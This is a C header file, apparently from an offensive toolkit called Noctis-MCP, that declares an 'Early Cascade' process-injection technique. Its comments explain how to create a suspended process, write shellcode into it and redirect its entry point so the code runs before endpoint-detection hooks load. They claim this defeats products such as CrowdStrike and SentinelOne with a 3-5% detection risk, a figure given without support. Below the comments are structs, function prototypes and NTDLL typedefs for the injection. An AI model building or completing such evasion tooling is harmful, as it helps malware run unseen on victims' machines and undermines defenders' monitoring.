// Reference code for Noctis-MCP AI intelligence system
// Early Cascade Injection - Pre-EDR Timing Attack
// Source: Advanced process injection research (2024)
// Research: Argus Red Team Intelligence Report 2024-2025 (Phase 2)
//
// TECHNIQUE: Early Process Initialization Injection
// IMPROVEMENT: Inject before EDR hooks are established
// DETECTION RISK: Extremely Low (3-5%) vs Standard injection (40-50%)
//
// How it works:
// 1. Create target process in suspended state (NtCreateProcessEx)
// 2. Map shellcode to process memory BEFORE initialization
// 3. Set entry point to shellcode address
// 4. Resume process - shellcode runs before EDR hooks
// 5. EDR hooks load AFTER shellcode executes
//
// Critical: Windows process initialization order:
//   1. Process creation (NtCreateProcessEx) - No hooks yet
//   2. Initial thread creation (suspended) - No hooks yet
//   3. <- INJECTION HAPPENS HERE (Early Cascade)
//   4. LdrInitializeThunk - Loads DLLs
//   5. EDR DLL injection - Hooks established
//   6. Process entry point
//
// By injecting at step 3, we execute before EDR can hook the process.
// This defeats ALL userland EDR hooks (CrowdStrike, SentinelOne, etc.)

#ifndef EARLY_CASCADE_H
#define EARLY_CASCADE_H

#include <Windows.h>
#include <winternl.h>

// Process creation flags for early cascade
#define PROCESS_CREATE_FLAGS_SUSPENDED 0x00000001
#define PROCESS_CREATE_FLAGS_BREAKAWAY 0x00000008

// Early cascade configuration
typedef struct _CASCADE_CONFIG {
    WCHAR wzTargetPath[MAX_PATH];      // Target process path (e.g., notepad.exe)
    PVOID pShellcode;                  // Shellcode to inject
    SIZE_T szShellcodeSize;            // Shellcode size
    BOOL bSetEntryPoint;               // Set entry point to shellcode (TRUE) or create thread (FALSE)
    BOOL bInheritHandles;              // Inherit handles from parent
} CASCADE_CONFIG, *PCASCADE_CONFIG;

// Early cascade context
typedef struct _CASCADE_CONTEXT {
    CASCADE_CONFIG config;
    HANDLE hProcess;                   // Target process handle
    HANDLE hThread;                    // Initial thread handle (suspended)
    DWORD dwProcessId;                 // Target process ID
    DWORD dwThreadId;                  // Initial thread ID
    PVOID pRemoteShellcode;            // Remote shellcode address
    PVOID pOriginalEntryPoint;         // Original process entry point
    CONTEXT threadContext;             // Thread context (for entry point modification)
} CASCADE_CONTEXT, *PCASCADE_CONTEXT;

// Initialize early cascade context
BOOL EarlyCascade_Initialize(
    PCASCADE_CONTEXT pContext,
    LPCWSTR wzTargetPath,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    BOOL bSetEntryPoint
);

// Execute early cascade injection
BOOL EarlyCascade_Execute(PCASCADE_CONTEXT pContext);

// Cleanup early cascade context
VOID EarlyCascade_Cleanup(PCASCADE_CONTEXT pContext);

// Internal: Create process in early suspended state
BOOL _EarlyCascade_CreateEarlyProcess(PCASCADE_CONTEXT pContext);

// Internal: Allocate and write shellcode to early process
BOOL _EarlyCascade_WriteShellcode(PCASCADE_CONTEXT pContext);

// Internal: Modify entry point to shellcode (if bSetEntryPoint=TRUE)
BOOL _EarlyCascade_ModifyEntryPoint(PCASCADE_CONTEXT pContext);

// Internal: Resume process execution (shellcode runs first)
BOOL _EarlyCascade_ResumeExecution(PCASCADE_CONTEXT pContext);

// Utility: Get process entry point from PEB
PVOID EarlyCascade_GetProcessEntryPoint(HANDLE hProcess);

// Utility: Set thread context entry point
BOOL EarlyCascade_SetThreadEntryPoint(HANDLE hThread, PVOID pNewEntryPoint, PCONTEXT pOriginalContext);

// NTDLL function typedefs for process creation
typedef NTSTATUS (NTAPI *fnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
);

typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *fnNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

#endif // EARLY_CASCADE_H
